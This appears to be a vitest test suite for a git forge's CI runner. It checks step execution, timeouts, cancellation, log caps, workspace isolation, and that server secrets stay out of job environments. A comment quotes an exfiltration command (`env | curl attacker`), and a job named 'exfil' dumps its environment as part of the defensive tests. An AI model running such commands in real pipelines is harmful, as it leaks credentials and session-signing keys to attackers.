import { vi, describe, it, expect, beforeAll, afterAll, beforeEach } from "vitest";
import { readFile } from "node:fs/promises";

// The runner touches only these two prisma models. Everything else is real:
// real git clone of a real bare repo, real `sh -c` step execution, real log files.
vi.mock("../prisma.js", () => ({
  prisma: {
    workflowRun: {
      findUnique: vi.fn(),
      update: vi.fn().mockResolvedValue({}),
      updateMany: vi.fn().mockResolvedValue({}),
    },
    checkRun: {
      update: vi.fn().mockResolvedValue({}),
      updateMany: vi.fn().mockResolvedValue({}),
    },
  },
}));

// Auto-merge (#119): the runner signals green completions into this module;
// mock it so the hook's wiring is assertable without the whole gate machinery.
vi.mock("../auto-merge.js", () => ({
  maybeAutoMergeForCommit: vi.fn().mockResolvedValue(undefined),
}));

import { prisma } from "../prisma.js";
import { cancelRun, currentRunId, enqueueRun, whenCiIdle } from "../ci/runner.js";
import { maybeAutoMergeForCommit } from "../auto-merge.js";
import { createTestRepo, makeCommit, type TestRepo } from "./helpers/git.js";

type CheckFixture = { id: string; jobId: string; jobName: string };

let repo: TestRepo;
beforeAll(async () => {
  repo = await createTestRepo("test/ci-runner.git");
}, 30_000);
afterAll(async () => { await repo?.cleanup(); });

beforeEach(() => {
  vi.clearAllMocks();
  vi.mocked(prisma.workflowRun.update).mockResolvedValue({} as never);
  vi.mocked(prisma.workflowRun.updateMany).mockResolvedValue({} as never);
  vi.mocked(prisma.checkRun.update).mockResolvedValue({} as never);
  vi.mocked(prisma.checkRun.updateMany).mockResolvedValue({} as never);
});

/** Poll `pred` until true or a timeout — for waiting on the async runner's state. */
async function waitFor(pred: () => boolean, timeoutMs = 5000): Promise<void> {
  const start = Date.now();
  while (!pred()) {
    if (Date.now() - start > timeoutMs) throw new Error("waitFor timed out");
    await new Promise((r) => setTimeout(r, 20));
  }
}

/** Commit a workflow (+ a marker file) and execute the run against real git. */
async function runWorkflow(
  workflowYaml: string,
  checkRuns: CheckFixture[],
): Promise<{
  runConclusion: string | undefined;
  checkConclusion: Map<string, string>;
  logByCheck: Map<string, string>;
}> {
  const commitSha = await makeCommit(
    repo.workDir,
    { ".forgehub/workflows/ci.yml": workflowYaml, "marker.txt": "MARKER_CONTENT" },
    "add workflow",
  );

  const runId = `run-${Math.random().toString(36).slice(2)}`;
  vi.mocked(prisma.workflowRun.findUnique).mockResolvedValue({
    id: runId,
    repoId: "repo-ci-1",
    commitSha,
    workflowPath: ".forgehub/workflows/ci.yml",
    repo: { storageKey: repo.storageKey },
    checkRuns,
  } as never);

  enqueueRun(runId);
  await whenCiIdle();

  const checkConclusion = new Map<string, string>();
  const logByCheck = new Map<string, string>();
  const logPathByCheck = new Map<string, string>();
  for (const call of vi.mocked(prisma.checkRun.update).mock.calls) {
    const arg = call[0] as { where: { id: string }; data: Record<string, unknown> };
    if (typeof arg.data.logPath === "string") logPathByCheck.set(arg.where.id, arg.data.logPath);
    if (arg.data.status === "completed") checkConclusion.set(arg.where.id, arg.data.conclusion as string);
  }
  for (const [id, p] of logPathByCheck) {
    logByCheck.set(id, await readFile(p, "utf8").catch(() => ""));
  }

  const runUpdates = vi.mocked(prisma.workflowRun.update).mock.calls.map((c) => c[0] as { data: Record<string, unknown> });
  const completed = runUpdates.find((u) => u.data.status === "completed");
  return { runConclusion: completed?.data.conclusion as string | undefined, checkConclusion, logByCheck };
}

describe("runner end-to-end", () => {
  it("runs an echo workflow to success and captures step output", async () => {
    const { runConclusion, checkConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  build:",
        "    name: Build",
        "    steps:",
        "      - name: Say hello",
        "        run: echo HELLO_FROM_CI",
        "      - name: Read checkout",
        "        run: cat marker.txt",
      ].join("\n"),
      [{ id: "chk-build", jobId: "build", jobName: "Build" }],
    );

    expect(runConclusion).toBe("success");
    expect(checkConclusion.get("chk-build")).toBe("success");
    const log = logByCheck.get("chk-build")!;
    expect(log).toContain("HELLO_FROM_CI");
    expect(log).toContain("=== Say hello ===");
    // Proves the commit was actually checked out into the workspace.
    expect(log).toContain("MARKER_CONTENT");
  });

  it("fails on the first failing step and preserves earlier output, skipping later steps", async () => {
    const { runConclusion, checkConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  test:",
        "    steps:",
        "      - run: echo FIRST_STEP_OUTPUT",
        "      - run: exit 3",
        "      - run: echo SHOULD_NOT_APPEAR",
      ].join("\n"),
      [{ id: "chk-test", jobId: "test", jobName: "test" }],
    );

    expect(runConclusion).toBe("failure");
    expect(checkConclusion.get("chk-test")).toBe("failure");
    const log = logByCheck.get("chk-test")!;
    expect(log).toContain("FIRST_STEP_OUTPUT"); // earlier output preserved
    expect(log).toContain("exited with code 3");
    expect(log).not.toContain("SHOULD_NOT_APPEAR"); // later step never ran
  });

  it("runs multiple jobs; the run fails if any job fails", async () => {
    const { runConclusion, checkConclusion } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  ok:",
        "    steps:",
        "      - run: echo good",
        "  bad:",
        "    steps:",
        "      - run: exit 1",
      ].join("\n"),
      [
        { id: "chk-ok", jobId: "ok", jobName: "ok" },
        { id: "chk-bad", jobId: "bad", jobName: "bad" },
      ],
    );

    expect(checkConclusion.get("chk-ok")).toBe("success");
    expect(checkConclusion.get("chk-bad")).toBe("failure");
    expect(runConclusion).toBe("failure");
  });

  it("times out a long step via CI_JOB_TIMEOUT and kills the process group", async () => {
    process.env["CI_JOB_TIMEOUT"] = "1"; // 1 second budget
    try {
      const { runConclusion, checkConclusion, logByCheck } = await runWorkflow(
        ["on: [push]", "jobs:", "  slow:", "    steps:", "      - run: sleep 30"].join("\n"),
        [{ id: "chk-slow", jobId: "slow", jobName: "slow" }],
      );
      expect(runConclusion).toBe("failure");
      expect(checkConclusion.get("chk-slow")).toBe("failure");
      expect(logByCheck.get("chk-slow")).toMatch(/CI_JOB_TIMEOUT/);
    } finally {
      delete process.env["CI_JOB_TIMEOUT"];
    }
  }, 15_000);
});

// ─── env maps (v1) ───────────────────────────────────────────────────────────────

describe("runner env maps", () => {
  it("merges workflow-level and job-level env into each step, job overrides workflow", async () => {
    const { runConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "env:",
        "  GREETING: hello_wf",
        "  SHARED: from_wf",
        "jobs:",
        "  build:",
        "    env:",
        "      SHARED: from_job",
        "    steps:",
        '      - run: echo "G=$GREETING S=$SHARED"',
      ].join("\n"),
      [{ id: "chk-build", jobId: "build", jobName: "build" }],
    );
    expect(runConclusion).toBe("success");
    const log = logByCheck.get("chk-build")!;
    expect(log).toContain("G=hello_wf");
    expect(log).toContain("S=from_job"); // job-level wins over workflow-level
  });
});

// ─── env allowlist: a step CANNOT see the API's secrets (issue #86, Tier 0) ──────

describe("runner step environment", () => {
  /**
   * The sharpest finding on #86: the runner spawned every step with
   * `{ ...process.env, ...env }`, so `env | curl attacker` handed over JWT_SECRET
   * and with it the ability to mint valid sessions for any user, including admins,
   * indefinitely and long after the run ended.
   *
   * This runs a REAL `sh -c` step that dumps its REAL environment, and asserts the
   * secrets are not in it — so it fails if anyone reintroduces the process.env
   * spread in runProcess, regardless of how the spread is spelled or which helper
   * it hides behind.
   */
  const SENTINELS = {
    JWT_SECRET: "jwt-sentinel-9d41c0f2-must-never-reach-a-step",
    DATABASE_URL: "file:/data/sentinel-forgehub.db",
    SMTP_PASSWORD: "smtp-sentinel-must-never-reach-a-step",
  };

  let saved: Record<string, string | undefined>;
  beforeEach(() => {
    saved = {};
    for (const [k, v] of Object.entries(SENTINELS)) {
      saved[k] = process.env[k];
      process.env[k] = v;
    }
  });
  afterAll(() => {
    for (const k of Object.keys(SENTINELS)) {
      if (saved?.[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
  });

  it("a step dumping `env` sees NEITHER JWT_SECRET NOR DATABASE_URL", async () => {
    const { runConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  exfil:",
        "    steps:",
        "      - name: Dump the environment",
        "        run: env",
        "      - name: Name the variables directly",
        '        run: echo "JWT=[$JWT_SECRET] DB=[$DATABASE_URL] ROOT=[$GIT_STORAGE_ROOT]"',
      ].join("\n"),
      [{ id: "chk-exfil", jobId: "exfil", jobName: "exfil" }],
    );

    expect(runConclusion).toBe("success"); // the step ran — this is not a vacuous pass
    const log = logByCheck.get("chk-exfil")!;

    // The values, wherever they might have been echoed from.
    expect(log).not.toContain(SENTINELS.JWT_SECRET);
    expect(log).not.toContain(SENTINELS.DATABASE_URL);
    expect(log).not.toContain(SENTINELS.SMTP_PASSWORD);
    // The names, as `env` would print them (`JWT_SECRET=…`).
    expect(log).not.toMatch(/^JWT_SECRET=/m);
    expect(log).not.toMatch(/^DATABASE_URL=/m);
    expect(log).not.toMatch(/^GIT_STORAGE_ROOT=/m);
    // Interpolation resolved to empty — the variables are absent, not blanked.
    expect(log).toContain("JWT=[] DB=[] ROOT=[]");
  }, 15_000);

  it("still gives a step the basics it needs to run at all", async () => {
    const { runConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  basics:",
        "    steps:",
        // marker.txt is committed by runWorkflow into the checked-out tree, so its
        // presence under $HOME is proof HOME points at this job's workspace.
        '      - run: echo "HAS_PATH=$([ -n "$PATH" ] && echo yes) CI=$CI HOME_IS_WS=$([ -f "$HOME/marker.txt" ] && echo yes)"',
      ].join("\n"),
      [{ id: "chk-basics", jobId: "basics", jobName: "basics" }],
    );
    expect(runConclusion).toBe("success");
    const log = logByCheck.get("chk-basics")!;
    expect(log).toContain("HAS_PATH=yes");
    expect(log).toContain("CI=true");
    // HOME is pinned to the job workspace, not the API user's home — so a step
    // cannot plant a ~/.gitconfig or ~/.npmrc that the API later reads.
    expect(log).toContain("HOME_IS_WS=yes");
  }, 15_000);
});

// ─── workspace clone is a real copy, not hardlinks into the live repo ────────────

describe("runner workspace clone", () => {
  /**
   * `git clone <local path>` hardlinks `.git/objects/*` into the source repo by
   * default, so the workspace's object files ARE the canonical bare repo's object
   * files and a step corrupting one corrupts what everyone pulls. `--no-hardlinks`
   * forces a copy. Asserted from INSIDE a step, by link count: 1 = a private copy,
   * ≥2 = shared inodes with the bare repo.
   */
  it("gives the job private object files (link count 1), not hardlinks into the bare repo", async () => {
    const { runConclusion, logByCheck } = await runWorkflow(
      [
        "on: [push]",
        "jobs:",
        "  links:",
        "    steps:",
        "      - run: echo MAXLINKS=$(find .git/objects -type f -printf '%n\\n' | sort -rn | head -1)",
      ].join("\n"),
      [{ id: "chk-links", jobId: "links", jobName: "links" }],
    );
    expect(runConclusion).toBe("success");
    const log = logByCheck.get("chk-links")!;
    // Guard against a vacuous pass if the repo somehow had no object files.
    expect(log).toMatch(/MAXLINKS=\d+/);
    expect(log).toContain("MAXLINKS=1");
  }, 15_000);
});

// ─── log byte cap end-to-end ────────────────────────────────────────────────────

describe("runner log cap", () => {
  /**
   * `yes > /dev/stdout` used to grow a job's log until the job timeout expired —
   * on the shipped compose stack, filling the volume that also held the SQLite
   * database. A tiny cap plus a short job budget reproduces that in a second.
   */
  it("caps a runaway step's log instead of letting it fill the disk", async () => {
    process.env["CI_MAX_LOG_BYTES"] = "8192";
    process.env["CI_JOB_TIMEOUT"] = "2";
    try {
      const { logByCheck } = await runWorkflow(
        [
          "on: [push]",
          "jobs:",
          "  flood:",
          "    steps:",
          "      - run: yes FLOOD",
        ].join("\n"),
        [{ id: "chk-flood", jobId: "flood", jobName: "flood" }],
      );
      const log = logByCheck.get("chk-flood")!;
      // Two seconds of `yes` is megabytes; the file must be cap + one marker line.
      expect(Buffer.byteLength(log)).toBeLessThan(8192 + 512);
      expect(log).toContain("FLOOD"); // real output was captured up to the cap
      expect(log).toContain("log truncated");
    } finally {
      delete process.env["CI_MAX_LOG_BYTES"];
      delete process.env["CI_JOB_TIMEOUT"];
    }
  }, 20_000);
});

// ─── re-run (fresh execution, own logs) ──────────────────────────────────────────

describe("runner re-run", () => {
  it("a second run of the SAME commit executes independently with its own log", async () => {
    // One commit (immutable sha) executed by two separate runs — the essence of a
    // re-run: change nothing, run again, each with its own fresh log.
    const commitSha = await makeCommit(
      repo.workDir,
      { ".forgehub/workflows/ci.yml": ["on: [push]", "jobs:", "  build:", "    steps:", "      - run: echo RERUN_OK"].join("\n") },
      "add workflow once",
    );

    async function execute(runId: string, checkId: string): Promise<string> {
      vi.mocked(prisma.workflowRun.findUnique).mockResolvedValue({
        id: runId, commitSha, workflowPath: ".forgehub/workflows/ci.yml",
        repo: { storageKey: repo.storageKey },
        checkRuns: [{ id: checkId, jobId: "build", jobName: "build" }],
      } as never);
      enqueueRun(runId);
      await whenCiIdle();
      const call = vi
        .mocked(prisma.checkRun.update)
        .mock.calls.map((c) => c[0] as { where: { id: string }; data: { logPath?: string } })
        .find((c) => c.where.id === checkId && typeof c.data.logPath === "string");
      return await readFile(call!.data.logPath!, "utf8");
    }

    const firstLog = await execute("run-orig", "chk-orig");
    const secondLog = await execute("run-rerun", "chk-rerun");
    expect(firstLog).toContain("RERUN_OK");
    expect(secondLog).toContain("RERUN_OK");
  }, 15_000);
});

// ─── cancel ──────────────────────────────────────────────────────────────────────

describe("runner cancel", () => {
  it("cancels a RUNNING job: kills the process fast, later jobs skipped", async () => {
    const commitSha = await makeCommit(
      repo.workDir,
      {
        ".forgehub/workflows/ci.yml": [
          "on: [push]",
          "jobs:",
          "  slow:",
          "    steps:",
          "      - run: sleep 30",
          "  after:",
          "    steps:",
          "      - run: echo AFTER_RAN",
        ].join("\n"),
      },
      "add slow workflow",
    );
    const runId = "run-cancel-running";
    // Check ids drive execution order (sorted): "chk-1slow" runs before "chk-2after".
    vi.mocked(prisma.workflowRun.findUnique).mockResolvedValue({
      id: runId,
      commitSha,
      workflowPath: ".forgehub/workflows/ci.yml",
      repo: { storageKey: repo.storageKey },
      checkRuns: [
        { id: "chk-1slow", jobId: "slow", jobName: "slow" },
        { id: "chk-2after", jobId: "after", jobName: "after" },
      ],
    } as never);

    enqueueRun(runId);
    await waitFor(() => currentRunId() === runId);
    // Let the clone finish and the sleep step actually spawn, then cancel it.
    await new Promise((r) => setTimeout(r, 400));
    await cancelRun(runId);
    await whenCiIdle(); // must resolve well under the 30s sleep → proves the kill

    // The run was finalized as cancelled.
    const runUpdate = vi
      .mocked(prisma.workflowRun.update)
      .mock.calls.map((c) => c[0] as { data: Record<string, unknown> })
      .find((u) => u.data.status === "completed");
    expect(runUpdate?.data.conclusion).toBe("cancelled");

    // The killed job's check was marked cancelled; the later job never started.
    const slowUpdate = vi
      .mocked(prisma.checkRun.update)
      .mock.calls.map((c) => c[0] as { where: { id: string }; data: Record<string, unknown> })
      .find((u) => u.where.id === "chk-1slow" && u.data.status === "completed");
    expect(slowUpdate?.data.conclusion).toBe("cancelled");
    const afterStarted = vi
      .mocked(prisma.checkRun.update)
      .mock.calls.some((c) => (c[0] as { where: { id: string } }).where.id === "chk-2after");
    expect(afterStarted).toBe(false); // later job skipped entirely
    // Remaining jobs finalized via updateMany.
    expect(prisma.checkRun.updateMany).toHaveBeenCalled();
  }, 15_000);

  it("cancels a QUEUED run before it starts (never executes)", async () => {
    const commitSha = await makeCommit(
      repo.workDir,
      {
        ".forgehub/workflows/ci.yml": ["on: [push]", "jobs:", "  slow:", "    steps:", "      - run: sleep 30"].join("\n"),
        ".forgehub/workflows/q.yml": ["on: [push]", "jobs:", "  q:", "    steps:", "      - run: echo QUEUED_RAN"].join("\n"),
      },
      "add two workflows",
    );
    const RUNNING = "run-busy";
    const QUEUED = "run-queued";
    vi.mocked(prisma.workflowRun.findUnique).mockImplementation(((args: { where: { id: string } }) => {
      if (args.where.id === RUNNING) {
        return Promise.resolve({
          id: RUNNING, commitSha, workflowPath: ".forgehub/workflows/ci.yml",
          repo: { storageKey: repo.storageKey },
          checkRuns: [{ id: "chk-busy", jobId: "slow", jobName: "slow" }],
        });
      }
      return Promise.resolve({
        id: QUEUED, commitSha, workflowPath: ".forgehub/workflows/q.yml",
        repo: { storageKey: repo.storageKey },
        checkRuns: [{ id: "chk-q", jobId: "q", jobName: "q" }],
      });
    }) as never);

    enqueueRun(RUNNING); // occupies the single worker with a 30s sleep
    enqueueRun(QUEUED); // sits in the queue behind it
    await waitFor(() => currentRunId() === RUNNING);

    await cancelRun(QUEUED); // dequeued + finalized without ever executing
    await cancelRun(RUNNING); // kill the sleep so the worker drains
    await whenCiIdle();

    // The queued run was finalized as cancelled via updateMany, and its job never ran.
    const queuedFinalized = vi
      .mocked(prisma.workflowRun.updateMany)
      .mock.calls.some((c) => {
        const a = c[0] as { where: { id: string }; data: Record<string, unknown> };
        return a.where.id === QUEUED && a.data.conclusion === "cancelled";
      });
    expect(queuedFinalized).toBe(true);
    const queuedStarted = vi
      .mocked(prisma.checkRun.update)
      .mock.calls.some((c) => (c[0] as { where: { id: string } }).where.id === "chk-q");
    expect(queuedStarted).toBe(false); // queued job never started
  }, 15_000);
});

// ─── Auto-merge completion signal (issue #119) ─────────────────────────────────

describe("runner auto-merge signal", () => {
  it("a GREEN run completion evaluates auto-merge for its commit", async () => {
    const { runConclusion } = await runWorkflow(
      ["on: [push]", "jobs:", "  ok:", "    steps:", "      - run: echo fine"].join("\n"),
      [{ id: "chk-ok", jobId: "ok", jobName: "ok" }],
    );
    expect(runConclusion).toBe("success");
    await waitFor(() => vi.mocked(maybeAutoMergeForCommit).mock.calls.length > 0);
    expect(vi.mocked(maybeAutoMergeForCommit)).toHaveBeenCalledTimes(1);
    expect(vi.mocked(maybeAutoMergeForCommit)).toHaveBeenCalledWith("repo-ci-1", expect.stringMatching(/^[0-9a-f]{40}$/));
  });

  it("a FAILED run does NOT signal auto-merge (it cannot turn the summary green)", async () => {
    const { runConclusion } = await runWorkflow(
      ["on: [push]", "jobs:", "  bad:", "    steps:", "      - run: exit 1"].join("\n"),
      [{ id: "chk-bad", jobId: "bad", jobName: "bad" }],
    );
    expect(runConclusion).toBe("failure");
    // Give any stray fire-and-forget call a beat to land, then assert silence.
    await new Promise((r) => setTimeout(r, 50));
    expect(vi.mocked(maybeAutoMergeForCommit)).not.toHaveBeenCalled();
  });
});
